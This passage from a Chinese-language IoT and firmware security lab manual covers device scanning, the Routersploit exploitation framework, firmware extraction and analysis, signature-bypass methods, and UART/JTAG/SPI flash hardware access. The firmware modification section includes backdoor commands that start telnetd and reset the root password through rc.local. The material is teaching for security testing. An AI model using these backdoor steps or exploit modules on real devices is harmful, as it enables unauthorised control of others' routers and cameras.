nmap -p 502 --script=modbus-discover 192.168.1.0/24

# S7扫描
nmap -p 102 --script=s7-info 192.168.1.0/24

# BACnet扫描
nmap -p 47808 --script=bacnet-info 192.168.1.0/24
```

**Nmap IoT设备发现脚本：**

```bash
cat > iot_scan.nse << 'EOF'
description = [[
IoT设备发现脚本
]]

author = "IoT Security"
license = "Same as Nmap"
categories = {"discovery", "safe"}

http = require "http"
shortport = require "shortport"

portrule = shortport.http

action = function(host, port)
    local paths = {
        "/",
        "/index.html",
        "/login.html",
        "/admin.cgi",
        "/cgi-bin/admin.cgi"
    }
    
    local results = {}
    
    for _, path in ipairs(paths) do
        local response = http.get(host, port, path)
        
        if response and response.body then
            local body = string.lower(response.body)
            
            -- 检测设备类型
            if string.find(body, "hikvision") then
                table.insert(results, "Hikvision Camera")
            elseif string.find(body, "dahua") then
                table.insert(results, "Dahua Camera")
            elseif string.find(body, "tp%-link") then
                table.insert(results, "TP-Link Router")
            elseif string.find(body, "d%-link") then
                table.insert(results, "D-Link Router")
            end
        end
    end
    
    if #results > 0 then
        return table.concat(results, ", ")
    end
end
EOF

# 使用自定义脚本
nmap -p 80 --script=./iot_scan.nse 192.168.1.0/24
```

### 29.5.3 Routersploit路由器漏洞利用框架

#### 【Linux环境】Routersploit安装与使用

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 克隆仓库
git clone https://github.com/threat9/routersploit.git
cd routersploit

# 安装依赖
pip3 install -r requirements.txt

# 运行
python3 rsf.py
```

**预期输出：```
 ______            _            _       _ _
(_____ \          | |          | |     | | |
 _____) )  ____  _| |_  _   _  | |_____| | |
|  ____/  / ___)/ _  _)| | | | |_____  | | |
| |      | |   ( (_| |_| |_| |      | |_|_|
|_|      |_|    \____) \__  |      |_|(_)
                      (____/
    The Router Exploitation Framework

rsf >
```

**常用命令：**

```bash
# 显示所有模块
show all

# 搜索模块
search dlink
search tp-link

# 使用漏洞模块
use exploits/routers/dlink/dsl_2750b_info_disclosure

# 查看模块信息
show info

# 查看选项
show options

# 设置目标
set target 192.168.1.1
set port 80

# 运行
run
exploit
```

**漏洞利用示例：**

```bash
# D-Link信息泄露
rsf > use exploits/routers/dlink/dsl_2750b_info_disclosure
rsf (DSL-2750B Info Disclosure) > set target 192.168.1.1
[+] {'target': '192.168.1.1'}
rsf (DSL-2750B Info Disclosure) > run
[*] Running module...
[+] Admin credentials found:
    Username: admin
    Password: admin
```

**扫描器使用：**

```bash
# 使用autopwn扫描器
use scanners/autopwn
set target 192.168.1.1
run

# 批量扫描
set target 192.168.1.0/24
run
```

### 29.5.4 Firmwalker固件信息提取

#### 【Linux环境】Firmwalker安装与使用

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 克隆仓库
git clone https://github.com/craigz28/firmwalker.git
cd firmwalker
chmod +x firmwalker.sh
```

**使用方法：**

```bash
# 先使用binwalk提取固件
binwalk -e firmware.bin

# 运行firmwalker分析提取的文件系统
./firmwalker.sh extracted_fs/

# 指定输出文件
./firmwalker.sh extracted_fs/ output.txt
```

**预期输出：**
```
[*] Firmwalker Analysis Results
[*] ==========================

[*] Searching for password related files...
[+] /etc/passwd
[+] /etc/shadow
[+] /etc/passwd-
[+] /etc/shadow-

[*] Searching for SSL/TLS certificates...
[+] /etc/cert.pem
[+] /etc/private.key

[*] Searching for SSH keys...
[+] /etc/dropbear/dropbear_rsa_host_key
[+] /etc/dropbear/dropbear_dss_host_key

[*] Searching for hardcoded credentials...
[+] admin:admin
[+] root:123456
```

**firmwalker搜索内容：**
- 密码相关文件（passwd、shadow）
- SSL/TLS证书
- SSH密钥
- 脚本文件（.sh、.py等）
- 配置文件
- 数据库文件
- 硬编码的IP地址
- 邮箱地址
- URL地址
- 弱口令模式

### 29.5.5 EMBA（嵌入式设备分析）

#### 【Linux环境】EMBA安装与使用

**操作位置：Kali Linux 终端**

**安装步骤：**

```bash
# 安装依赖
sudo apt install docker.io docker-compose -y

# 克隆仓库
git clone https://github.com/e-m-b-a/emba.git
cd emba

# 安装脚本
sudo ./installer.sh -d

# 使用Docker安装（推荐）
sudo ./installer.sh -D
```

**使用方法：**

```bash
# 分析固件
sudo ./emba.sh -f firmware.bin -l ./logs -m /tmp -p ./scan-profiles/default-scan.emba

# 仅提取固件
sudo ./emba.sh -f firmware.bin -l ./logs -x

# 指定架构
sudo ./emba.sh -f firmware.bin -a MIPS -l ./logs

# Web报告
sudo ./emba.sh -f firmware.bin -l ./logs -Z
```

**EMBA扫描模块：**
- 固件提取与识别
- 操作系统识别
- 漏洞检测（CVE匹配）
- 配置文件分析
- 二进制分析
- 认证机制分析
- 网络服务分析
- 密码分析

### 29.5.6 ATT&CK for ICS

#### 【通用】MITRE ATT&CK for ICS

**操作位置：浏览器**

```bash
# MITRE ATT&CK for ICS官网
https://attack.mitre.org/matrices/ics/

# 工业控制系统战术
- 初始访问（Initial Access）
- 执行（Execution）
- 持久化（Persistence）
- 权限提升（Privilege Escalation）
- 规避（Evasion）
- 发现（Discovery）
- 横向移动（Lateral Movement）
- 收集（Collection）
- 命令与控制（Command and Control）
- 影响（Impact）
```

**ATT&CK for ICS矩阵：**

```
战术/技术        初始访问   执行   持久化  权限提升   规避    发现   横向移动  收集    C2     影响
─────────────────────────────────────────────────────────────────────────────────────────────────────
工程化应用        X         X      X        X        X        X       X        X      X      X
系统信息发现     X       X         X              X
远程服务        X         X      X        X
供应商系统      X                                  X
...
```

**学习资源：**

```bash
# ATT&CK for ICS GitHub
https://github.com/mitre-attack/attack-stix-data

# 工控安全知识库
https://collaborate.mitre.org/attackics
```

---

## 29.6 固件分析环境

### 29.6.1 固件获取方法

**固件获取途径：**

| 方法 | 说明 | 难度 |
|-----|------|------|
| 官方网站下载 | 从厂商官网下载固件更新包 | 低 |
| OTA抓包 | 抓取设备OTA更新流量 | 中 |
| 编程器读取 | 从Flash芯片直接读取固件 | 高 |
| UART/JTAG | 通过调试接口提取固件 | 高 |
| 漏洞利用 | 通过设备漏洞获取固件 | 中 |

#### 【Linux环境】OTA抓包获取固件

**操作位置：Kali Linux 终端**

```bash
# 使用mitmproxy抓取OTA更新流量
sudo apt install mitmproxy -y

# 启动代理
mitmweb --listen-port 8080

# 配置设备代理指向Kali
# 然后触发设备检查更新
```

### 29.6.2 固件解包与分析工具链

#### 【Linux环境】完整固件分析流程

**操作位置：Kali Linux 终端**

**工具链组成：**

```
固件 → binwalk → 文件系统 → firmwalker → 静态分析 → 动态仿真 → 漏洞验证
```

**完整分析流程脚本：**

```bash
cat > firmware_analysis.sh << 'EOF'
#!/bin/bash

FIRMWARE=$1
OUTPUT_DIR="analysis_results"

if [ -z "$FIRMWARE" ]; then
    echo "Usage: $0 <firmware_file>"
    exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[*] Step 1: 固件基本信息分析"
file "$FIRMWARE" > "$OUTPUT_DIR/01_file_info.txt"
echo "[+] 保存到 $OUTPUT_DIR/01_file_info.txt"

echo ""
echo "[*] Step 2: binwalk分析"
binwalk "$FIRMWARE" > "$OUTPUT_DIR/02_binwalk_analysis.txt"
echo "[+] 保存到 $OUTPUT_DIR/02_binwalk_analysis.txt"

echo ""
echo "[*] Step 3: 提取固件内容"
binwalk -eM "$FIRMWARE" -C "$OUTPUT_DIR/extracted"
echo "[+] 提取到 $OUTPUT_DIR/extracted"

echo ""
echo "[*] Step 4: 查找文件系统"
find "$OUTPUT_DIR/extracted" -type d -name "squashfs-root" -o -name "jffs2-root" > "$OUTPUT_DIR/03_filesystems.txt"
cat "$OUTPUT_DIR/03_filesystems.txt"

echo ""
echo "[*] Step 5: 固件熵分析"
binwalk -E "$FIRMWARE" > "$OUTPUT_DIR/04_entropy.txt"
echo "[+] 熵分析保存到 $OUTPUT_DIR/04_entropy.txt"

echo ""
echo "[*] Step 6: 字符串提取"
strings "$FIRMWARE" | grep -E "(password|admin|root|secret|key|token)" -i > "$OUTPUT_DIR/05_strings.txt"
echo "[+] 字符串提取保存到 $OUTPUT_DIR/05_strings.txt"

echo ""
echo "[*] 分析完成！结果保存在 $OUTPUT_DIR/"
EOF

chmod +x firmware_analysis.sh

# 使用
./firmware_analysis.sh firmware.bin
```

### 29.6.3 固件漏洞挖掘

#### 【Linux环境】静态分析工具

**操作位置：Kali Linux 终端**

**常用静态分析工具：**

```bash
# Ghidra安装（NSA开源逆向工具）
sudo apt install ghidra -y

# Binary Ninja（商业软件，有试用版）
# https://binary.ninja/

# IDA Pro（商业软件）
# https://hex-rays.com/

# Radare2开源逆向框架
sudo apt install radare2 -y
```

**Radare2使用示例：**

```bash
# 基本分析
r2 firmware.bin

# 分析二进制
aaa

# 列出函数
afl

# 反汇编函数
pdf @ main

# 搜索字符串
iz

# 搜索交叉引用
axt
```

**漏洞模式搜索：**

```bash
# 搜索危险函数
# strcpy、strcat、sprintf、system、exec等

# 使用grep在二进制中搜索
strings firmware.bin | grep -E "(strcpy|strcat|sprintf|system|exec)"

# 在提取的文件系统中搜索
grep -r "system(" extracted_fs/
grep -r "strcpy(" extracted_fs/
```

### 29.6.4 固件签名验证绕过

#### 【通用】固件签名验证常见攻击方法

**签名验证绕过技术：**

1. **修改版本号**：将固件版本号改为更高版本绕过检查
2. **头信息伪造**：修改固件头部的校验和、大小等字段
3. **签名移除**：移除签名字段，测试是否仍可刷入
4. **加密绕过**：找到未加密的固件更新路径
5. **硬件绕过**：通过编程器直接刷写Flash
6. **U-Boot利用**：通过U-Boot命令行刷写固件

**固件头部分析：**

```bash
# 查看固件头部
xxd firmware.bin | head -20

# 使用binwalk分析头信息
binwalk -v firmware.bin

# 手动分析固件头结构
# 通常包含：魔数、版本、大小、校验和、签名等
```

### 29.6.5 固件刷写与修改

#### 【Linux环境】固件修改与重打包

**操作位置：Kali Linux 终端**

**固件修改流程：**

```
原始固件 → 解包 → 修改文件 → 重打包 → 刷写测试
```

**修改示例（添加后门）：**

```bash
# 1. 提取固件
binwalk -e firmware.bin

# 2. 修改启动脚本
cd extracted_fs/squashfs-root/etc/
echo "telnetd &" >> rc.local
echo "echo 'root:password' | chpasswd" >> rc.local

# 3. 重新打包squashfs
mksquashfs squashfs-root new_fs.squashfs -comp gzip -noappend

# 4. 重新组合固件
# （根据固件格式使用不同工具）
```

---

## 29.7 硬件安全实验

### 29.7.1 UART串口调试

#### 【通用】UART硬件连接

**所需硬件：**
- USB转TTL模块（CH340、PL2303、FT232）
- 杜邦线（母对母）
- 万用表
- 电烙铁（可选）

**操作位置：硬件实验台**

**UART引脚识别：**

```bash
# 常见UART引脚标记
- TX (Transmit) - 发送
- RX (Receive)  - 接收
- GND (Ground)  - 地
- VCC (Voltage) - 电源（3.3V或5V）

# 连接方式
USB-TTL    设备
TX    ↔    RX
RX    ↔    TX
GND   ↔    GND
VCC   ↔    VCC（可选，用于供电）
```

#### 【Linux环境】UART调试软件

**操作位置：Kali Linux 终端**

**安装串口工具：**

```bash
# 安装minicom
sudo apt install minicom -y

# 安装screen
sudo apt install screen -y

# 安装picocom
sudo apt install picocom -y
```

**串口连接：**

```bash
# 查找USB串口设备
dmesg | grep ttyUSB
ls /dev/ttyUSB*

# 使用minicom连接
minicom -D /dev/ttyUSB0 -b 115200

# 使用screen连接
screen /dev/ttyUSB0 115200

# 使用picocom连接
picocom -b 115200 /dev/ttyUSB0
```

**预期输出：**
```
U-Boot 1.1.4 (Jan  1 2020 - 00:00:00)

Board: Router Board
DRAM:  64 MB
Flash:  8 MB
Net:   eth0
Hit any key to stop autoboot:  3
```

**常见波特率：**
- 9600
- 19200
- 38400
- 57600
- 115200（最常见）
- 230400
- 460800
- 921600

### 29.7.2 JTAG/SWD接口

#### 【通用】JTAG硬件连接

**JTAG引脚：**

```
┌─────────────────────────────────────────┐
│           JTAG标准引脚                    │
├─────────────────────────────────────────┤
│  TCK (Test Clock)     - 测试时钟         │
│  TMS (Test Mode Select) - 测试模式选择   │
│  TDI (Test Data In)   - 测试数据输入      │
│  TDO (Test Data Out)  - 测试数据输出      │
│  TRST (Test Reset)    - 测试复位（可选）  │
│  SRST (System Reset)  - 系统复位（可选）  │
│  GND                  - 地              │
│  VCC                  - 电源            │
└─────────────────────────────────────────┘
```

**所需硬件：**
- J-Link仿真器（或ST-Link、FT2232等）
- JTAG排线
- 万用表
- 逻辑分析仪（可选）

#### 【Linux环境】OpenOCD安装与使用

**操作位置：Kali Linux 终端**

**安装OpenOCD：**

```bash
sudo apt install openocd -y
```

**J-Link连接示例：**

```bash
# 创建配置文件
cat > jtag.cfg << 'EOF'
source [find interface/jlink.cfg]
source [find target/stm32f1x.cfg]
adapter speed 1000
EOF

# 启动OpenOCD
openocd -f jtag.cfg

# 通过telnet连接
telnet localhost 4444
```

**常用OpenOCD命令：**

```
# 查看目标
targets

# 挂起目标
halt

# 读取寄存器
reg

# 读取内存
mdw 0x08000000 16

# 读取Flash
flash read_bank 0 firmware.bin 0 0x10000

# 写入Flash
flash write_bank 0 firmware.bin 0

# 复位
reset
reset halt
```

**预期输出：**
```
Open On-Chip Debugger 0.10.0
Licensed under GNU GPL v2
For bug reports, read
        http://openocd.org/doc/doxygen/bugs.html
adapter speed: 1000 kHz
Info : J-Link ARM V8 compiled
Info : J-Link caps 0xb9ff7bbf
Info : This adapter doesn't support configurable speed
Info : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477
```

### 29.7.3 逻辑分析仪使用

#### 【通用】逻辑分析仪基础

**所需硬件：**
- Saleae Logic（或兼容的USB逻辑分析仪）
- 测试钩/杜邦线
- 被测设备

**常用逻辑分析仪：**
- Saleae Logic 8 / Pro 8 / Pro 16
- DreamSourceLab DSLogic
- sigrok兼容设备

#### 【Linux环境】Sigrok / PulseView安装

**操作位置：Kali Linux 终端**

**安装：**

```bash
sudo apt install sigrok pulseview -y
```

**使用PulseView：**

```bash
# 启动PulseView
pulseview

# 命令行使用sigrok-cli
# 列出设备
sigrok-cli --list-serial

# 采集数据
sigrok-cli --driver=<driver> --samples=1M --channels=D0,D1 -o output.sr
```

**UART协议解析：**

```bash
# 解析UART数据
sigrok-cli -i capture.sr -P uart:baudrate=115200 -B uart

# 实时解析
sigrok-cli --driver=<driver> --channels=D0 -P uart:baudrate=115200 -B uart --continuous
```

### 29.7.4 Flash读取

#### 【通用】Flash芯片读取方法

**常见Flash类型：**
- SPI Flash（最常见）
- NAND Flash
- NOR Flash
- eMMC

**SPI Flash引脚：**

```
┌─────────┐
│ CS   1 ● 8  VCC │
│ DO   2   7  HOLD│
│ WP   3   6  CLK │
│ GND  4   5  DI  │
└─────────┘

CS   - Chip Select
DO   - Data Out (MISO)
DI   - Data In (MOSI)
CLK  - Clock
WP   - Write Protect
HOLD - Hold
VCC  - Power (3.3V)
GND  - Ground
```

#### 【Linux环境】SPI Flash读取工具

**操作位置：Kali Linux 终端**

**使用CH341A编程器：**

```bash
# 安装flashrom
sudo apt install flashrom -y

# 读取Flash
flashrom -p ch341a_spi -r firmware.bin

# 写入Flash
flashrom -p ch341a_spi -w firmware.bin

# 擦除Flash
flashrom -p ch341a_spi -E

# 验证
flashrom -p ch341a_spi -v firmware.bin
```

**预期输出：**
```
flashrom v1.2 on Linux 5.10.0 (x86_64)
flashrom is free software, get the source code at https://flashrom.org

Calibrating delay loop... delay loop is unreliable, trying to continue OK.
Found Winbond flash chip "W25Q64.V" (8192 kB, SPI) on ch341a_spi.
Reading flash... done.
```

**使用Raspberry Pi读取SPI Flash：**

```bash
# 启用SPI
sudo raspi-config
# Interface Options → SPI → Enable

# 安装flashrom
sudo apt install flashrom -y

# 读取
sudo flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin
```

### 29.7.5 侧信道分析基础

#### 【通用】侧信道攻击类型

**常见侧信道攻击：**

| 攻击类型 | 说明 | 难度 |
|---------|------|------|
| 功耗分析（DPA/CPA） | 通过分析功耗变化获取密钥 | 高 |
| 电磁分析（EMA） | 通过电磁辐射泄露获取信息 | 高 |
| 时序分析 | 通过执行时间差异获取信息 | 中 |
| 故障注入 | 通过注入故障绕过安全检查 | 高 |
| 声学分析 | 通过声音泄露获取信息 | 高 |

#### 【Linux环境】侧信道分析工具

**操作位置：Kali Linux 终端**

**安装分析工具：**

```bash
# ChipWhisperer（侧信道分析平台）
pip3 install chipwhisperer

# 安装Jupyter Notebook用于分析
pip3 install jupyter notebook
```

**ChipWhisperer示例：**

```python
import chipwhisperer as cw

# 连接设备
scope = cw.scope()
target = cw.target(scope)

# 设置示波器参数
scope.gain.gain = 45
scope.adc.samples = 5000
scope.adc.offset = 0

# 采集功耗轨迹
scope.arm()
target.simpleserial_write('p', plaintext)
ret = scope.capture()
trace = scope.get_last_trace()

# 保存数据
import numpy as np
np.save("trace.npy", trace)
```

### 29.7.6 电子焊接基础

#### 【通用】焊接工具清单

**必备工具：**
- 恒温电烙铁（推荐936焊台或T12）
- 焊锡丝（0.8mm带松香）
- 助焊剂（松香或焊锡膏）
- 吸锡器/吸锡带
- 镊子
- 放大镜/显微镜
- 万用表

**安全注意事项：**
- 焊接时注意高温，防止烫伤
- 保持通风，避免吸入焊锡烟雾
- 焊接完成后及时清洁烙铁头
- 防静电保护（焊接CMOS器件时）

#### 【通用】基本焊接技术

**焊接步骤：**

```
1. 准备工作
   - 清洁焊盘和引脚
   - 给烙铁头上锡

2. 预热
   - 用烙铁头同时加热焊盘和引脚

3. 上锡
   - 从另一侧送入焊锡丝
   - 让焊锡自然流动包裹引脚

4. 冷却
   - 保持不动几秒让焊锡冷却凝固

5. 检查
   - 检查焊点是否光亮、圆润
   - 用万用表检查是否导通
```

**常见问题：**

| 问题 | 原因 | 解决方法 |
|-----|------|---------|
| 虚焊 | 加热不足或焊锡过多 | 重新加热，加适量焊锡 |
| 桥接 | 焊锡过多连接相邻引脚 | 用吸锡器/吸锡带清除多余焊锡 |
| 冷焊 | 焊接时移动了元件 | 重新加热焊接 |
| 焊盘脱落 | 加热时间过长 | 飞线修复 |

---

## 常见问题

### Q1: binwalk提取固件失败怎么办？

**A:** 可以尝试以下方法：
1. 使用 `-eM` 参数进行递归提取
2. 尝试不同的工具（firmware-mod-kit、jefferson）
3. 手动分析固件格式
4. 检查固件是否加密
5. 使用 `-f` 参数强制提取

### Q2: QEMU仿真固件无法启动？

**A:** 常见原因和解决方法：
1. 架构不匹配：确认固件是MIPS还是ARM，大端还是小端
2. 缺少必要的库：使用 `-L` 参数指定库路径
3. 内核不兼容：使用合适的内核版本
4. 文件系统问题：检查文件系统格式是否正确
5. 使用FirmAE等自动化工具

### Q3: 找不到设备的UART引脚怎么办？

**A:** 可以通过以下方法查找：
1. 查看PCB上的丝印标记（TX、RX、GND等）
2. 用万用表测量电压，找VCC和GND
3. 用逻辑分析仪捕捉启动时的信号
4. 查找设备的拆机图或技术文档
5. 尝试常见的测试点

### Q4: JTAG连接失败怎么办？

**A:** 排查步骤：
1. 检查接线是否正确
2. 确认设备已上电
3. 降低JTAG时钟速率
4. 检查引脚是否被复用或禁用
5. 使用边界扫描工具检测JTAG链

### Q5: 固件是加密的怎么办？

**A:** 解密方法：
1. 查找设备中的解密密钥（硬编码密钥）
2. 通过漏洞利用获取密钥
3. 通过硬件调试接口获取密钥
4. 分析OTA更新流程
5. 侧信道攻击获取密钥
6. 寻找未加密的固件版本

### Q6: 如何学习IoT安全？

**A:** 学习路径建议：
1. 基础：网络安全、编程（C/Python）、Linux
2. 固件分析：binwalk、IDA/Ghidra、QEMU
3. 硬件安全：UART、JTAG、逻辑分析仪
4. 实战：刷漏洞固件、复现CVE
5. 社区：参加IoT安全会议、CTF比赛
6. 工具：熟练使用Routersploit、FirmAE、EMBA

### Q7: IoT渗透测试需要哪些硬件？

**A:** 基础硬件清单：
- USB转TTL模块（CH340、FT232）
- J-Link或ST-Link仿真器
- 逻辑分析仪（Saleae或兼容）
- CH341A编程器
- 万用表
- 电烙铁和焊接工具
- 各种杜邦线和测试钩
- 树莓派（用于各种实验）

### Q8: 路由器漏洞复现环境搭建有什么建议？

**A:** 建议：
1. 从简单漏洞开始（命令注入、信息泄露）
2. 使用FirmAE快速搭建仿真环境
3. 准备几台真实的二手路由器
4. 关注CVE和安全公告
5. 使用Routersploit框架快速验证
6. 记录每一步的操作和结果
